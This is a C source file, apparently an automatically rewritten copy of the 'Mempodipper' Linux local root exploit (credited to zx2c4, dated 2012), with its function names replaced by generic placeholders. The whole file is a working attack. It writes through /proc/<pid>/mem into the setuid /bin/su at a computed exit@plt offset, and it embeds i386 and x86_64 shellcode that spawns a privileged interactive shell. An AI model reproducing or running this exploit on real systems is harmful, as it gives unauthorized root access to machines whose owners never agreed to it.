#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int /*<<< orphan*/  O_RDWR ; 
 int /*<<< orphan*/  SEEK_SET ; 
 unsigned long ULONG_MAX ; 
 int /*<<< orphan*/  FUNC0 (int,int) ; 
 int /*<<< orphan*/  FUNC1 (char*,char*,char*,char*,...) ; 
 int /*<<< orphan*/  FUNC2 (char*,int,int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC3 () ; 
 int FUNC4 () ; 
 int /*<<< orphan*/  FUNC5 (int,unsigned long,int /*<<< orphan*/ ) ; 
 int FUNC6 (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 int /*<<< orphan*/ * FUNC9 (char*,char*) ; 
 int /*<<< orphan*/  FUNC10 (char*,...) ; 
 int FUNC11 () ; 
 int /*<<< orphan*/  FUNC12 (int) ; 
 int /*<<< orphan*/  FUNC13 (char*,char*,...) ; 
 char* FUNC14 (char*,char*) ; 
 unsigned long FUNC15 (char*,int /*<<< orphan*/ *,int) ; 

int FUNC16(int argc, char **argv)
{
	if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'c') {
		char parent_mem[256];
		FUNC13(parent_mem, "/proc/%s/mem", argv[2]);
		FUNC10("[+] Opening parent mem %s in child.\n", parent_mem);
		int fd = FUNC6(parent_mem, O_RDWR);
		if (fd < 0) {
			FUNC8("[-] open");
			return 1;
		}
		FUNC10("[+] Sending fd %d to parent.\n", fd);
		FUNC12(fd);
		return 0;
	}
	
	FUNC10("===============================\n");
	FUNC10("=          Mempodipper        =\n");
	FUNC10("=           by zx2c4          =\n");
	FUNC10("=         Jan 21, 2012        =\n");
	FUNC10("===============================\n\n");
	
	int parent_pid = FUNC4();
	if (FUNC3()) {
		FUNC10("[+] Waiting for transferred fd in parent.\n");
		int fd = FUNC11();
		FUNC10("[+] Received fd at %d.\n", fd);
		if (fd < 0) {
			FUNC8("[-] recv_fd");
			return -1;
		}
		FUNC10("[+] Assigning fd %d to stderr.\n", fd);
		FUNC0(2, 6);
		FUNC0(fd, 2);

		unsigned long address;
		if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'o')
			address = FUNC15(argv[2], NULL, 16);
		else {
			FUNC10("[+] Reading su for exit@plt.\n");
			// Poor man's auto-detection. Do this in memory instead of relying on objdump being installed.
			FILE *command = FUNC9("objdump -d /bin/su|grep 'exit@plt'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'", "r");
			char result[32];
			result[0] = 0;
			FUNC2(result, 32, command);
			FUNC7(command);
			address = FUNC15(result, NULL, 16);
			if (address == ULONG_MAX || !address) {
				FUNC10("[-] Could not resolve /bin/su. Specify the exit@plt function address manually.\n");
				FUNC10("[-] Usage: %s -o ADDRESS\n[-] Example: %s -o 0x402178\n", argv[0], argv[0]);
				return 1;
			}
			FUNC10("[+] Resolved exit@plt to 0x%lx.\n", address);
		}
		FUNC10("[+] Calculating su padding.\n");
		FILE *command = FUNC9("su this-user-does-not-exist 2>&1", "r");
		char result[256];
		result[0] = 0;
		FUNC2(result, 256, command);
		FUNC7(command);
		unsigned long su_padding = (FUNC14(result, "this-user-does-not-exist") - result) / sizeof(char);
		unsigned long offset = address - su_padding;
		FUNC10("[+] Seeking to offset 0x%lx.\n", offset);
		FUNC5(fd, offset, SEEK_SET);
		
#if defined(__i386__)
		// See shellcode-32.s in this package for the source.
		char shellcode[] =
			"\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xb0\x2e\xcd\x80\x31\xc9\xb3"
			"\x06\xb1\x02\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68"
			"\x68\x2f\x2f\x62\x69\x89\xe3\x31\xd2\x66\xba\x2d\x69\x52\x89"
			"\xe0\x31\xd2\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd"
			"\x80";
#elif defined(__x86_64__)
		// See shellcode-64.s in this package for the source.
		char shellcode[] =
			"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xff\xb0\x6a\x0f\x05\x40"
			"\xb7\x06\x40\xb6\x02\xb0\x21\x0f\x05\x48\xbb\x2f\x2f\x62\x69"
			"\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xdb"
			"\x66\xbb\x2d\x69\x53\x48\x89\xe1\x48\x31\xc0\x50\x51\x57\x48"
			"\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05";

#else
#error "That platform is not supported."
#endif
		FUNC10("[+] Executing su with shellcode.\n");
		FUNC1("/bin/su", "su", shellcode, NULL);
	} else {
		char pid[32];
		FUNC13(pid, "%d", parent_pid);
		FUNC10("[+] Executing child from child fork.\n");
		FUNC1("/proc/self/exe", argv[0], "-c", pid, NULL);
	}
}